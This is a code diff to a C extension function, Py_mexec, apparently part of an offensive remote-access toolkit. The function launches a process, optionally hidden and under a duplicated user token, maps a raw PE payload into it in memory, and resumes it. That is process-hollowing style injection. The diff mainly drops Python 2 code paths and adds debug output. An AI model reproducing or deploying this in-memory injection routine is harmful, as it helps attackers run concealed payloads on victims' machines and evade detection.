@@ -76,11 +76,7 @@ static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 
 static PyObject *Py_mexec(PyObject *self, PyObject *args) {
         PROCESS_INFORMATION pi;
-#if PYMAJ > 2
         STARTUPINFOW si;
-#else
-        STARTUPINFOA si;
-#endif
 
         SECURITY_ATTRIBUTES saAttr = {
                 sizeof(SECURITY_ATTRIBUTES),
@@ -127,21 +123,21 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                 return NULL;
 #endif
 
-        if (!(PyUnicode_Check(py_cmdline) || PyBytes_Check(py_cmdline))) {
-                return PyErr_Format(
-                        PyExc_Exception, "cmdline must be either str or unicode"
-                );
+        dprint(
+            "Py_mexec::passed payload (%p size=%lu)\n",
+            pe_raw_bytes, pe_raw_bytes_len
+        );
+
+        if (!PyUnicode_Check(py_cmdline)) {
+            return PyErr_Format(
+                PyExc_Exception, "cmdline must me unicode object"
+            );
         }
 
-#if PYMAJ > 2
-        memset(&si,0,sizeof(STARTUPINFOW));
-        memset(&pi,0,sizeof(PROCESS_INFORMATION));
+        memset(&si, 0, sizeof(STARTUPINFOW));
         si.cb = sizeof(STARTUPINFOW);
-#else
-        memset(&si,0,sizeof(STARTUPINFOW));
-        memset(&pi,0,sizeof(PROCESS_INFORMATION));
-        si.cb = sizeof(STARTUPINFOW);
-#endif
+
+        memset(&pi, 0, sizeof(PROCESS_INFORMATION));
 
         if(py_hidden && PyObject_IsTrue(py_hidden)){
                 si.dwFlags |= STARTF_USESHOWWINDOW;
@@ -150,127 +146,123 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
         }
 
         if (!py_redirect_stdio || PyObject_IsTrue(py_redirect_stdio)) {
-                if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
-                        return PyErr_Format(PyExc_Exception, "Error in CreatePipe (IN): Errno %d", GetLastError());
-                }
+            dprint("Py_mexec::passed redirect stdio required\n");
 
-                if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
-                        CloseHandle(g_hChildStd_IN_Rd);
-                        CloseHandle(g_hChildStd_IN_Wr);
-                        return PyErr_Format(PyExc_Exception, "Error in CreatePipe (OUT): Errno %d", GetLastError());
-                }
+            if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
+                return PyErr_Format(
+                    PyExc_Exception, "Error in CreatePipe (IN): Errno %d", GetLastError());
+            }
 
-                si.hStdInput  = g_hChildStd_IN_Rd;
-                si.hStdOutput = g_hChildStd_OUT_Wr;
-                si.hStdError  = g_hChildStd_OUT_Wr;
-                si.dwFlags   |= STARTF_USESTDHANDLES;
-                inherit=TRUE;
+            if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
+                CloseHandle(g_hChildStd_IN_Rd);
+                CloseHandle(g_hChildStd_IN_Wr);
+                return PyErr_Format(
+                    PyExc_Exception, "Error in CreatePipe (OUT): Errno %d", GetLastError());
+            }
+
+            si.hStdInput  = g_hChildStd_IN_Rd;
+            si.hStdOutput = g_hChildStd_OUT_Wr;
+            si.hStdError  = g_hChildStd_OUT_Wr;
+            si.dwFlags   |= STARTF_USESTDHANDLES;
+
+            inherit = TRUE;
         }
 
         if (!dupHandleAddress) {
-                BOOL blCreated;
-                if (PyUnicode_Check(py_cmdline)) {
-                        size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
-                        size_t size = wsize * sizeof(wchar_t);
+            BOOL blCreated;
 
-                        wchar_t *tmpstr = malloc(size);
-                        RtlZeroMemory(tmpstr, size);
+            size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
+            size_t size = wsize * sizeof(wchar_t);
 
-                        dprint("Py_mexec::unicode cmdline, size=%d\n", wsize);
+            wchar_t *tmpstr = malloc(size);
+            RtlZeroMemory(tmpstr, size);
 
-                        PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
-                        blCreated = CreateProcessW(
-                                NULL, tmpstr,
-                                &saAttr, NULL, inherit,
-                                createFlags, NULL, NULL, &si, &pi
-                        );
-                        free(tmpstr);
-                }
-#if PYMAJ < 3
-                else {
-                        blCreated = CreateProcessA(
-                                NULL, PyString_AsString(py_cmdline),
-                                &saAttr, NULL, inherit,
-                                createFlags, NULL, NULL, &si, &pi
-                        );
-                        dprint("Py_mexec::char cmdline\n");
-                }
-#endif
+            dprint("Py_mexec::unicode cmdline, size=%d\n", wsize);
 
-                if(!blCreated) {
-                        CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
-                        CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+            PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
+            blCreated = CreateProcessW(
+                NULL, tmpstr,
+                &saAttr, NULL, inherit,
+                createFlags, NULL, NULL, &si, &pi
+            );
 
-                        return PyErr_Format(
-                                PyExc_Exception, "Error in CreateProcess: Errno %d",
-                                GetLastError()
-                        );
-                }
+            free(tmpstr);
+
+            if(!blCreated) {
+                DWORD dwLastError = GetLastError();
+
+                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+
+                return PyErr_Format(
+                    PyExc_Exception, "Error in CreateProcess: Errno %d", dwLastError
+                );
+            }
 
         } else {
-                BOOL blCreated;
-                dupHandle=(HANDLE) dupHandleAddress;
+            BOOL blCreated;
 
-                if (PyUnicode_Check(py_cmdline)) {
-                        size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
-                        size_t size = wsize * sizeof(wchar_t);
+            size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
+            size_t size = wsize * sizeof(wchar_t);
 
-                        wchar_t *tmpstr = malloc(size);
+            wchar_t *tmpstr = malloc(size);
 
-                        RtlZeroMemory(tmpstr, size);
+            RtlZeroMemory(tmpstr, size);
 
-                        PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
-                        blCreated = CreateProcessAsUserW(
-                                dupHandle, NULL, tmpstr, &saAttr,
-                                NULL, inherit, createFlags, NULL, NULL, &si, &pi
-                        );
-                        free(tmpstr);
-                }
-#if PYMAJ < 3
-                else {
-                        blCreated = CreateProcessAsUserA(
-                                dupHandle, NULL, PyString_AsString(py_cmdline), &saAttr,
-                                NULL, inherit, createFlags, NULL, NULL, &si, &pi
-                        );
-                }
-#endif
-                if (!blCreated) {
-                        CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
-                        CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+            PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
 
-                        return PyErr_Format(
-                                PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x", GetLastError(),
-                                dupHandle
-                        );
-                }
+            dupHandle = (HANDLE) dupHandleAddress;
+
+            blCreated = CreateProcessAsUserW(
+                dupHandle, NULL, tmpstr, &saAttr,
+                NULL, inherit, createFlags, NULL, NULL, &si, &pi
+            );
+
+            free(tmpstr);
+
+            if (!blCreated) {
+                DWORD dwLastError = GetLastError();
+
+                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+
+                return PyErr_Format(
+                    PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x",
+                    dwLastError, dupHandle
+                );
+            }
         }
 
         CloseHandle(g_hChildStd_IN_Rd);
         CloseHandle(g_hChildStd_OUT_Wr);
 
-        if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
-                DWORD dwErrno = GetLastError();
+        dprint("Py_mexec::Push to container\n");
 
-                TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hProcess);
-                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
-                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
-                return PyErr_Format(
-                        PyExc_Exception,
-                        "Error in MapNewExecutableRegionInProcess: Errno %d",
-                        dwErrno
-                );
+        if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
+            DWORD dwErrno = GetLastError();
+
+            TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hProcess);
+            CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+            CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+
+            return PyErr_Format(
+                PyExc_Exception,
+                "Error in MapNewExecutableRegionInProcess: Errno %d",
+                dwErrno
+            );
         }
 
         if (ResumeThread(pi.hThread) == (DWORD)-1) {
-                TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hProcess);
-                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
-                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
-                return PyErr_Format(
-                        PyExc_Exception,
-                        "Error in ResumeThread: Errno %d", GetLastError()
-                );
+            TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hProcess);
+            CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+            CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+
+            return PyErr_Format(
+                PyExc_Exception,
+                "Error in ResumeThread: Errno %d", GetLastError()
+            );
         }
 
         CloseHandle(pi.hThread);
